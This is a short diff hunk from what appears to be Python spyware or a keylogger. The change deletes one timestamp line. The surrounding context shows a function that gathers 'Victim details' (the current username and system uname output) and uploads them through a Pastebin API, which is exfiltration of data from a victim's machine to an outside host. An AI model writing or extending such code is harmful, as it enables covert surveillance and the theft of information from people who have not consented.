@@ -43,7 +43,7 @@ def get_pastebin_api():
             
 #Check fill buffer to send.
 def fill_buffer_upload(myInode, uploadInterval):
-    ct = datetime.datetime.now()
+    
     bufferToUp = {getpass.getuser():("Victim details: {}".format(uname()))}
     try:
         api = get_pastebin_api()
